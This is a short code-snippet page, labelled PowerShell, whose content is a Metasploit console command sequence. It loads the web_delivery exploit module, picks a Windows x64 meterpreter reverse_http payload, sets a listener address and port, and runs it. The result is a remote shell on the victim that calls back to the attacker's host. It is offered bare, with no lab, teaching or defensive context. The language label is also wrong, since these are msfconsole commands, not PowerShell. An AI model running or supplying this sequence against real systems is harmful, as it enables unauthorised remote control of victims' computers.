---
id: 7d8cb550-b5ff-49e3-828c-207ebe97ef54
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:21.342121+00:00'
updated_at: '2023-04-10T20:25:00.365273+00:00'
---

# Code Snippet 7d8cb550

**Language**: Powershell

```powershell
use exploit/multi/script/web_delivery
set TARGET 2
set payload windows/x64/meterpreter/reverse_http
set LHOST 10.0.0.1
set LPORT 4444
run
```


